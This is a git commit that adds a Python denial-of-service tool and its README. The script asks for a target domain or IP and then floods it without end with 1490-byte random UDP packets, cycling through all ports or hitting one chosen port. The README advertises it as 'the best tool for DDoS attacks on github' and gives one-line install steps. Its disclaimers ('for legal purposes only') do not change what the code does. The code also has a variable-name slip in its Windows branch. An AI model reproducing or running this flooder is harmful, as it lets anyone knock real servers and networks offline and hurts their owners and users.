f9818d8420b3024d4f6f58bff916ddb3adf87e5d
Chai-Programming <83523587+CPScript@users.noreply.github.com>
2022-11-10 11:16:32 -0500

    Add files via upload

---
+++ RDDoS_Tool.py
@@ -0,0 +1,153 @@
+"""
+Copyright (c) 2020-2021 Vladimir Rogozin (vladimir20040609@gmail.com)
+
+Distributed under the MIT License (MIT) (See accompanying file LICENSE.txt
+or copy at http://opensource.org/licenses/MIT)
+"""
+
+# Import.
+from   platform import system
+from   tqdm.auto import tqdm
+import os
+import time
+import random
+import socket
+import pyfiglet
+
+
+# Version.
+version = "1.2"
+
+
+# Platform info
+uname=system()
+
+if uname == "Windows":
+    cmd_clear_clear = 'cls'
+else:
+    cmd_clear = 'clear'
+
+os.system(cmd_clear)
+
+
+# Socket
+sock  = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+bytes = random._urandom(1490)
+
+
+# RDDoS_Tool
+while True:
+    # UI.
+    print("\033[91m   _____ \033[0m         \033[95m  ______    ______         __ \033[0m     ______)        Version: " + version)       
+    print("\033[91m  (, /   )      /)\033[0m \033[95m(, /    ) (, /    )   (__/  )\033[0m    (, /        /)") 
+    print("\033[91m    /__ /  _  _(/\033[0m  \033[95m  /    /    /    / ___  /     \033[0m     /  ______// ")
+    print("\033[91m ) /   \\__(/_(_(_\033[0m\033[95m  _/___ /_  _/___ /_(_)) /     \033[0m   ) /  (_)(_)(/_")
+    print("\033[91m(_/\033[0m              \033[95m(_/___ /  (_/___ /    (_/      \033[0m  (_/\n")
+    print("                        Author: Mr.\033[91mRed\033[0m")
+    print("       Github: https://github.com/Red-company/RDDoS_Tool")
+    print('                   For legal purposes only')
+    print("\033[92;1m")
+    print("1. Website Domain\n2. IP Address\n3. About\n4. Exit")
+    print('\033[0m')
+
+    # Input.
+    opt = str(input("\n> "))
+
+    # Selection.
+    if opt == '1':
+        domain = str(input("Domain:"))
+        ip = socket.gethostbyname(domain)
+        break
+
+    elif opt == '2':
+        ip = str(input("IP Address: "))
+        break
+
+    elif opt == '3':
+        print("\n\033[101mEasy.       .سهل\033[0m  \033[101m       \033[0m  \033[101m        \033[0m \033[101m       \033[0m \033[0m                \033[92m_____\033[0m")
+        print("                  \033[101m   \033[0m  \033[101m   \033[0m \033[101m   \033[0m      \033[101m   \033[0m  \033[101m   \033[0m\033[0m             \033[92m.-'     '-.\033[0m")
+        print("\033[101mOpen.      .افتح\033[0m  \033[101m       \033[0m  \033[101m      \033[0m   \033[101m   \033[0m  \033[101m   \033[0m           \033[92m.'\033[91m____\033[0m secure\033[92m'.\033[0m")
+        print("                  \033[101m   \033[0m \033[101m   \033[0m  \033[101m   \033[0m      \033[101m   \033[0m  \033[101m   \033[0m          \033[92m/  \033[91m|  _ \\\033[0m  \033[93m__\033[0m   \033[92m\\\033[0m")
+        print("\033[101mSecure.    .يؤمن\033[0m  \033[101m   \033[0m  \033[101m   \033[0m \033[101m        \033[0m \033[101m       \033[0m          \033[92m;\033[0m r \033[91m| |_) /\033[0m\033[93m/ o\\\033[0m t \033[92m;\033[0m")
+        print("                                                     \033[92m|\033[0m e \033[91m|  _ <\033[0m \033[93m\\__/\033[0m e \033[92m|\033[0m")
+        print("RedDDoS Tool is an open source tool for              \033[92m;\033[0m d \033[91m|_| \\ \\\033[0m \033[93m<|\033[0m  a \033[92m;\033[0m")
+        print("penetration. You can test networks/servers/any        \033[92m\\       \033[91m\\/\033[0m \033[93m<|\033[0m  m\033[92m/\033[0m")
+        print("other devices with it.                                 \033[92m'.\033[0m member \033[93m<|\033[0m \033[92m.'\033[0m")
+        print("                                                         \033[92m'-._____.-'\033[0m")
+        print("Author of the program is not responsible for")
+        print("it's usage, everybody MUST use it ONLY in         member-id: 'rst-00000002'")
+        print("legit cases.")
+        print("\nFor more information visit project's site.")
+        
+        goon = input("\n\n\n\n\n\n\nPress Enter to continue.")
+        os.system(cmd_clear)
+
+    elif opt == '4':
+        exit()
+
+    else:
+        print('\033[91mInvaild Choice!\033[0m')
+        time.sleep(2)
+        os.system(cmd_clear)
+
+# Port selection.
+port_mode = False # If 'False' all ports will be use, if 'True' - certain.
+port = 2
+
+while 1:
+    port_bool = str(input("Certain port? [y/n]: "))
+
+    if (port_bool == "y") or (port_bool == "Y"):
+        port_mode = True
+        port = int(input("Port: "))
+        break
+
+    elif (port_bool == "n") or (port_bool == "N"):
+        break
+
+    else:
+        print('\033[91mInvaild Choice!\033[0m')
+        time.sleep(2)
+
+# Starting working.
+os.system(cmd_clear)
+print('\033[36;2mINITIALIZING....')
+time.sleep(1)
+print('STARTING...')
+time.sleep(4)
+
+sent = 0
+
+if port_mode == False:  # All ports.
+    try:
+        while True:
+            if port == 65534:
+                port = 1
+
+            elif port == 1900:
+                port = 1901
+
+            sock.sendto(bytes, (ip, port))
+            sent += 1
+            port += 1
+            print("\033[32;1mSent %s packets to %s through port:%s"%(sent, ip, port))
+    except:
+        print('\n\033[31;1mExited\033[0m')
+
+elif port_mode == True: # Certain port.
+    if port < 2:
+        port = 2
+        
+    elif port == 65534:
+        port = 2
+
+    elif port == 1900:
+        port = 1901
+
+    try:
+        while True:
+            sock.sendto(bytes, (ip, port))
+            sent += 1
+            print("\033[32;1mSent %s packets to %s through port:%s"%(sent, ip, port))      
+    except:
+        print('\n\033[31;1mExited\033[0m')
---
+++ README.md
@@ -0,0 +1,61 @@
+# 🔫 Red DDoS Tool (توزيع ريد لأداة رفض الخدمة) ![](https://img.shields.io/apm/l/vim-mode) ![](https://img.shields.io/github/stars/Red-company/RDDoS_Tool?style=social)
+
+<p align="left" display="inline-block">
+<img title="Built With Love" src="https://forthebadge.com/images/badges/built-with-love.svg"> <img title="Open Source" src="https://img.shields.io/badge/Open%20Source-%E2%99%A5-red"></p>
+
+![plot](./Screenshots/RDDoS_main.png)
+
+## What is RedDDoS Tool?
+```diff
+! This is the best tool for DDoS attacks on github.
+```
+
+ _RedDDoS Tool_ is a tool for DDoS attacks. You can test networks/servers/any other devices with it.
+
+## How it Works? 
+ It sends continuous packets to the target. This attack is known as _DDoS attack_.
+
+## What is DDoS Attack?
+ In a _Distributed Denial-of-Service_ attack (_DDoS attack_), the incoming traffic flooding the victim originates. This effectively makes it impossible to connect to an other device.
+
+## Supported Devices:
+ This program is supported in all operating system like _Linux_, _Windows_ and _MacOs_. The Code is written in _python3_, so Don't worry it works well without any bugs.
+
+## Installing (_Windows/Linux/MacOs/Termux_):
+```
+apt-get update -y
+apt-get install git
+git clone https://github.com/Red-company/RDDoS_Tool.git
+cd RDDoS_Tool
+bash setup.sh
+python3 RDDoS_Tool.py
+```
+
+## One line Installation:
+```
+apt-get update -y && apt-get install git && git clone https://github.com/Red-company/RDDoS_Tool.git && cd RDDoS_Tool && bash setup.sh && python3 RDDoS_Tool.py
+```
+
+## Errors? Troubleshooting is here:
+If it's about libraries, just write these strings:
+```
+pip install tqdm
+pip install pyfiglet
+```
+
+## Screenshots? Here they are:
+
+![plot](./Screenshots/RDDoS_about.png)
+
+![plot](./Screenshots/RDDoS_ip.png)
+
+![plot](./Screenshots/RDDoS_preparing.png)
+
+![plot](./Screenshots/RDDoS_process.png)
+
+## Disclaimer
+
+This tool must be used in educational purposes only. Your decisions are not our responsibility.
+
+##
+All material in this repository is in the public domain.
